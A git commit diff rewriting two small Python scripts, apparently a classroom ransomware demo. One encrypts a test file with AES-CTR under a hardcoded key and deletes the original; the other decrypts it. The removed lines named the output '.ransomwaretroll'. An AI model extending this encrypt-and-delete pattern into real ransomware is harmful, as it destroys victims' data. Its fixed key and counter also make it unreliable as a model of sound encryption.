c38478a08f05427c7108785aa9b4192101c21c74
Jonathas Guedes Borges <113917403+Jonathas-Borges@users.noreply.github.com>
2024-11-04 08:55:25 -0400

    Códigos de encriptografia e descriptografia

--- decrypter.py
+++ decrypter.py
@@ -1,22 +1,20 @@
-import os
 import pyaes
 
-## abrir o arquivo criptografado
-file_name = "teste.txt.ransomwaretroll"
-file = open(file_name, "rb")
-file_data = file.read()
-file.close()
+encrypted_file_name = "teste.txt.enc"
 
-## chave para descriptografia
-key = b"testeransomwares"
+key = b'1234567890123456'
+
+# Ler o conteúdo do arquivo criptografado
+with open(encrypted_file_name, 'rb') as encrypted_file:
+    encrypted_data = encrypted_file.read()
+
+# Criar uma nova instância AES para descriptografar
 aes = pyaes.AESModeOfOperationCTR(key)
-decrypt_data = aes.decrypt(file_data)
+decrypt_data = aes.decrypt(encrypted_data)
 
-## remover o arquivo criptografado
-os.remove(file_name)
+# Salvar o conteúdo descriptografado em um novo arquivo
+decrypted_file_name = "teste_decrypted.txt"
+with open(decrypted_file_name, 'wb') as decrypted_file:
+    decrypted_file.write(decrypt_data)
 
-## criar o arquivo descriptografado
-new_file = "teste.txt"
-new_file = open(f'{new_file}', "wb")
-new_file.write(decrypt_data)
-new_file.close()
+print(f"Arquivo '{encrypted_file_name}' foi descriptografado como '{decrypted_file_name}'.")
--- encrypter.py
+++ encrypter.py
@@ -1,24 +1,24 @@
 import os
 import pyaes
 
-## abrir o arquivo a ser criptografado
+
 file_name = "teste.txt"
-file = open(file_name, "rb")
-file_data = file.read()
-file.close()
+# Chave de criptografia (16 bytes para AES-128)
+key = b'1234567890123456'
 
-## remover o arquivo
+# Criptografar o arquivo
+with open(file_name, 'rb') as file:
+    file_data = file.read()
+    aes = pyaes.AESModeOfOperationCTR(key)
+    encrypt_data = aes.encrypt(file_data)
+
+
+# Salvar o arquivo criptografado
+encrypted_file_name = "teste.txt.enc"
+with open(encrypted_file_name, 'wb') as encrypted_file:
+    encrypted_file.write(encrypt_data)
+
+print(f"Arquivo '{file_name}' criptografado como '{encrypted_file_name}'.")
+
+
 os.remove(file_name)
-
-## chave de criptografia
-key = b"testeransomwares"
-aes = pyaes.AESModeOfOperationCTR(key)
-
-## criptografar o arquivo
-crypto_data = aes.encrypt(file_data)
-
-## salvar o arquivo criptografado
-new_file = file_name + ".ransomwaretroll"
-new_file = open(f'{new_file}','wb')
-new_file.write(crypto_data)
-new_file.close()
